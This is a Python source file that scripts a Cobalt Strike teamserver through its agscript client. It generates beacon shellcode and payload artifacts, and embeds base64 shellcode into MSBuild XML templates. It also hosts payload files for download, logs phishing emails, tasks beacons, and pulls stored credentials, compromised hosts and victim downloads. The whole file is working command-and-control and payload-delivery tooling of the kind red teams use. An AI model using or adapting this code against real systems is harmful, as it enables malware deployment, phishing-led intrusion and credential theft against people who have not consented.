#!/usr/local/bin/python3

# The idea for this tool and some code came from redshell: https://github.com/Verizon/redshell

import pexpect
import getpass
from os import path
from os.path import abspath
from re import findall, DOTALL, VERBOSE, escape, compile, MULTILINE
import base64
from time import sleep
import sys
from collections import defaultdict
from sleep_python_bridge.sleepy import wrap_command, deserialize, convert_to_oneline
from enum import Enum

class ArtifactType(Enum):
	DLL = "dll"
	EXE = "exe"
	POWERSHELL = "powershell"
	PYTHON = "python"
	RAW = "raw"
	SVCEXE = "svcexe"
	VBSCRIPT = "vbscript"


### Start CSConnector Class ###
class CSConnector:
	def __init__(self, cs_host, cs_user=None, cs_pass=None, cs_directory="./", cs_port=50050):
		self.cs_host = cs_host

		if not cs_user or not cs_pass or not cs_port:
			agproperties = self.parse_aggressor_properties()
			if cs_host in agproperties:
				cs_user = agproperties[cs_host]["user"]
				cs_port = agproperties[cs_host]["port"]
				cs_pass = agproperties[cs_host]["password"]

		self.cs_user = cs_user + "_striker"
		if not cs_pass:
			self.cs_pass = getpass.getpass("Enter Cobalt Strike password: ")
		else:
			self.cs_pass = cs_pass
		self.cs_port = cs_port
		self.cs_directory = cs_directory

		# -----------------------------------------------------------------
		# Confirmed /opt/cobaltstrike layout (CS 4.x):
		#
		#   /opt/cobaltstrike/
		#     client/
		#       agscript          ← binary  ✓
		#       cobaltstrike-client.jar
		#     cobaltstrike.jar    ← root JAR  ✓
		#     teamserver
		#
		# agscript resolves cobaltstrike.jar relative to its own location
		# (../cobaltstrike.jar).  pexpect cwd must be the CS root so that
		# relative path resolves correctly.
		#
		# Old code: self.aggscriptcmd = "'{cs_directory}/agscript'"  ← WRONG
		# -----------------------------------------------------------------
		client_agscript = path.join(self.cs_directory, "client", "agscript")
		root_agscript   = path.join(self.cs_directory, "agscript")

		if path.exists(client_agscript):
			self.aggscriptcmd = f"'{client_agscript}'"
		elif path.exists(root_agscript):
			self.aggscriptcmd = f"'{root_agscript}'"
		else:
			# Fall back; connectTeamserver will raise a descriptive error.
			self.aggscriptcmd = f"'{client_agscript}'"

		# Always use the CS root as cwd — agscript needs ../cobaltstrike.jar
		self._agscript_cwd = self.cs_directory

		self.cs_process = None

	def __enter__(self) -> 'CSConnector':
		self.connectTeamserver()
		return self

	def __exit__(self, type, value, tb):
		self.disconnectTeamserver()

	##### Payload Generation #######

	def generateMSBuild(self, agscriptPath, listener, outputPath='./', staged=False, x64=True):
		shellcode = self.generateShellcode(listener, staged=staged, x64=x64)
		if shellcode:
			encoded = base64.b64encode(shellcode)
			arch = "64" if x64 else "32"
			filename = 'staged' if staged else 'stageless'
			templateFile = f'Helpers/msBuild/artifact_{arch}.xml'
			templatePath = path.join(agscriptPath, templateFile)
			filename = path.join(outputPath, f'{filename}_{arch}.xml')
			with open(templatePath, 'rt') as read_file:
				data = read_file.read()
			data = data.replace('%%DATA%%', encoded.decode())
			with open(filename, 'wt') as write_file:
				write_file.write(data)

	def generateShellcode(self, listener, staged=False, x64=True):
		return self.generatePayload(listener, ArtifactType.RAW, staged=staged, x64=x64)

	def generatePayload(self, listener, artifact_type, staged=False, x64=True, exit='', callmethod=''):
		arch = "x64" if x64 else "x86"
		if staged:
			cmd = f"return base64_encode(artifact_stager('{listener}', '{artifact_type.value}', '{arch}'))"
		else:
			if len(callmethod) > 0 and len(exit) > 0:
				cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}', '{exit}', '{callmethod}'))"
			else:
				cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}'))"
		encoded_bytes = self.ag_get_object(cmd, timeout=30000)
		return base64.b64decode(encoded_bytes)

	##### Payload/File Hosting ########

	def hostFile(self, file_path, site=None, port=80, uri='/hosted.txt',
	             mime_type='text/plain', description='Autohosted File',
	             use_ssl=False, sleep_time=2):
		if not site:
			site = self.get_local_ip()
			site = f"\"{site}\"" if site else "localip()"
		else:
			site = "\"{}\"".format(site)

		sites = self.get_sites()
		for a_site in sites:
			if a_site.get('Type') == 'page':
				if f"\"{a_site.get('Host')}\"" == site and a_site.get('URI') == uri:
					self.killHostedFile(port=port, uri=uri)

		link = ("https" if use_ssl else "http") + "://{}:{}{}".format(site.strip('"'), port, uri)
		use_ssl_str = "true" if use_ssl else "false"

		if file_path[0] != '/':
			file_path = abspath(file_path)
		file_path = f"'{file_path}'"

		multiline = f"""
		$handle = openf({file_path});
		$content = readb($handle, -1);
		closef($handle);
		site_host({site}, {port}, "{uri}", $content, "{mime_type}", "{description}", {use_ssl_str});
		"""
		self.ag_sendline_multiline(multiline, sleep_time=sleep_time)
		return link

	def killHostedFile(self, port=80, uri='/hosted.txt'):
		self.ag_sendline(f'site_kill({port}, "{uri}")', sleep_time=1)

	##### Log Item to Teamserver ######

	def logToEventLog(self, string, event_type=None):
		if event_type == "ioc":
			header = "Indicator of Compromise"
		elif event_type == "external":
			header = "External Action Taken"
		else:
			header = "Striker String Log"
		self.ag_sendline(f'elog("{header}: {string}")', sleep_time=1)

	def logEmail(self, email_to, email_from, email_sender_ip, email_subject, iocs=None):
		elog_string = "Phishing email sent:\\nSending IP: {}\\nTo: {}\\nFrom: {}\\nSubject: {}\\n".format(
			email_sender_ip, email_to, email_from, email_subject)
		if iocs:
			ioc_string = "Email IoCs: \\n"
			for ioc_name in iocs.keys():
				ioc_string += "- {}: {}\\n".format(ioc_name, iocs[ioc_name])
			elog_string += ioc_string
		self.ag_sendline('elog("{}")'.format(elog_string), sleep_time=1)

	def taskBeacon(self, bid, string, attack_id=None):
		self.ag_sendline('btask({}, "{}", "{}")'.format(bid, string, attack_id), sleep_time=1)

	def logToBeaconLog(self, bid, string):
		self.ag_sendline(f'blog({bid}, "{string}")', sleep_time=1)

	def logToBeaconLogAlt(self, bid, string):
		self.ag_sendline(f'blog2({bid}, "{string}")', sleep_time=1)

	def getEmailLogs(self):
		multiline = """
		@email_logs = @();
		foreach $entry (archives()) {
			if ("Phishing email sent:*" iswm $entry["data"]) {
				add(@email_logs, $entry['data']);
			}
		}
		return @email_logs;
		"""
		return self.ag_get_object_multiline(multiline)

	def getEmailIoCs(self):
		multiline = """
		@email_iocs = @();
		foreach $entry (archives()) {
			if ("Email Indicator of Compromise:*" iswm $entry["data"]) {
				add(@email_iocs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @email_iocs;
		"""
		return self.ag_get_object_multiline(multiline)

	def getIoCs(self):
		multiline = """
		@iocs = @();
		foreach $entry (archives()) {
			if ("*Indicator of Compromise:*" iswm $entry["data"]) {
				add(@iocs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @iocs;
		"""
		return self.ag_get_object_multiline(multiline)

	def getExternalActions(self):
		multiline = """
		@external_actions = @();
		foreach $entry (archives()) {
			if ("External Action Taken:*" iswm $entry["data"]) {
				add(@external_actions, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @external_actions;
		"""
		return self.ag_get_object_multiline(multiline)

	def getStringLogs(self):
		multiline = """
		@string_logs = @();
		foreach $entry (archives()) {
			if ("Striker String Log:*" iswm $entry["data"]) {
				add(@string_logs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @string_logs;
		"""
		return self.ag_get_object_multiline(multiline)

	##### Helper Functions #####

	def get_beaconlog(self):
		return self.ag_get_object('return data_query("beaconlog")')

	def ag_ls_scripts(self):
		return self.ag_get_string('', script_console_command='ls')

	def ag_load_script(self, script_path):
		self.ag_sendline(script_path, 'load')

	def get_local_ip(self):
		return self.ag_get_object("return localip()")

	def get_listener_info(self, name):
		return self.ag_get_object(f'return listener_info("{name}")')

	def get_listeners_local(self):
		return self.ag_get_object("return listeners_local()")

	def get_listeners_stageless(self):
		return self.ag_get_object("return listeners_stageless()")

	def get_beacons(self):
		return self.ag_get_object("return beacons()")

	def get_users(self):
		return self.ag_get_object("return users()")

	def get_credentials(self):
		return self.ag_get_object("return credentials()")

	def get_hosts(self):
		return self.ag_get_object("return hosts()")

	def get_sites(self):
		return self.ag_get_object("return sites()")

	def get_targets(self):
		return self.ag_get_object("return targets()")

	def get_downloads(self):
		"""Return the teamserver download list.

		Each entry is a dict with keys:
		  bid   — beacon ID that triggered the download
		  name  — original filename on the target
		  path  — path fragment used during the download task
		  lpath — local path on the teamserver where CS saved the file
		  size  — file size in bytes
		"""
		return self.ag_get_object("return downloads()")

	def get_pivots(self):
		return self.ag_get_object("return pivots()")

	def connectTeamserver(self):
		"""Connect to CS team server."""

		# cobaltstrike.jar lives at the CS root (confirmed from /opt/cobaltstrike ls)
		jar_path = path.join(self.cs_directory, "cobaltstrike.jar")
		if not path.exists(jar_path):
			raise Exception(
				f"Error: Cobalt Strike JAR not found at '{jar_path}'. "
				f"Verify CS_DIR={self.cs_directory} is correct."
			)

		self.cs_process = pexpect.spawn(
			"{} {} {} {} {}".format(
				self.aggscriptcmd,
				self.cs_host,
				self.cs_port,
				self.cs_user,
				self.cs_pass,
			),
			cwd=self._agscript_cwd,
		)

		if not self.cs_process.isalive():
			raise Exception("Error connecting to CS team server! Check config and try again.")

		try:
			self.cs_process.expect(r'\x1b\[4maggressor\x1b\[0m>', timeout=5)
			self.send_ready_command()
		except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
			print(self.cs_process.before.decode())
			raise Exception("EOF encountered") from None

	def send_ready_command(self):
		cmd = 'on ready { println("Successfully" . " connected to teamserver!"); }'
		expect = '.*Successfully connected to teamserver!.*'
		self.ag_get_string(cmd, expect=expect)

	def disconnectTeamserver(self):
		if self.cs_process:
			self.cs_process.close()
		else:
			print("CS was already disconnected! Hopefully you already knew this.")

	def ag_sendline(self, cmd, script_console_command='e', sleep_time=0):
		full_cmd = "{}".format(script_console_command) if cmd == '' \
		           else "{} {}".format(script_console_command, cmd)
		self.cs_process.sendline(full_cmd)
		sleep(sleep_time)
		return full_cmd

	def ag_sendline_multiline(self, multiline, script_console_command='e', sleep_time=0):
		oneline = convert_to_oneline(multiline)
		return self.ag_sendline(oneline, script_console_command=script_console_command,
		                        sleep_time=sleep_time)

	def ag_get_string_multiline(self, multiline, script_console_command='e',
	                            expect=r'\r\n\x1b\[4maggressor\x1b\[0m>',
	                            timeout=-1, sleep_time=0):
		oneline = convert_to_oneline(multiline)
		return self.ag_get_string(oneline, script_console_command=script_console_command,
		                          expect=expect, timeout=timeout, sleep_time=sleep_time)

	def ag_get_string(self, cmd, script_console_command='e',
	                  expect=r'\r\n\x1b\[4maggressor\x1b\[0m>',
	                  timeout=-1, sleep_time=0):
		full_cmd = self.ag_sendline(cmd, script_console_command=script_console_command,
		                            sleep_time=sleep_time)
		self.cs_process.expect(escape(full_cmd), timeout=timeout)
		self.cs_process.expect(expect, timeout=timeout)
		return self.cs_process.before.decode()

	def ag_get_object_multiline(self, multiline, script_console_command='e',
	                            expect=r'\r\n\x1b\[4maggressor\x1b\[0m>',
	                            timeout=-1, sleep_time=0):
		oneline = convert_to_oneline(multiline)
		return self.ag_get_object(oneline, script_console_command=script_console_command,
		                          expect=expect, timeout=timeout, sleep_time=sleep_time)

	def ag_get_object(self, cmd, script_console_command='e',
	                  expect=r'\r\n\x1b\[4maggressor\x1b\[0m>',
	                  timeout=-1, sleep_time=0):
		wrapped = wrap_command(cmd)
		match = self.ag_get_string(wrapped, script_console_command=script_console_command,
		                           expect=expect, timeout=timeout, sleep_time=sleep_time)
		base64_regex = r"^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$"
		parse = findall(base64_regex, match, MULTILINE)
		if parse:
			return deserialize(parse[0])
		else:
			raise Exception(f"Base64 regex found no match on {match[:50]}") from None

	def parse_aggressor_properties(self, aggprop=None):
		connections = defaultdict(dict)
		if not aggprop:
			homedir = path.expanduser("~")
			aggprop = f"{homedir}/.aggressor.prop"
		with open(aggprop, "r") as file:
			for line in file.readlines():
				if "connection.profiles." in line:
					regexes = [
						r"connection\.profiles\.(.*?)\.user=(.*)",
						r"connection\.profiles\.(.*?)\.password=(.*)",
						r"connection\.profiles\.(.*?)\.port=(.*)"
					]
					keys = ["user", "password", "port"]
					for regex, key in zip(regexes, keys):
						matches = findall(regex, line)
						if matches:
							ip, value = matches[0]
							connections[ip][key] = value
		return connections


### End CSConnector Class ###


##### Main ########

def parseArguments():
	parser = ArgumentParser()
	parser.add_argument("-t", "--teamserver", required=True)
	parser.add_argument("-u", "--user", default=environ.get('USER'))
	parser.add_argument("-p", "--password", default=None)
	parser.add_argument("-P", "--port", default=50050)
	parser.add_argument("-j", "--javadir", default="./")
	return parser.parse_args()


def main():
	args = parseArguments()
	with CSConnector(args.teamserver, cs_user=args.user, cs_pass=args.password,
	                 cs_directory=args.javadir, cs_port=args.port) as cs:
		pass

if __name__ == '__main__':
	from argparse import ArgumentParser
	from os import environ
	main()
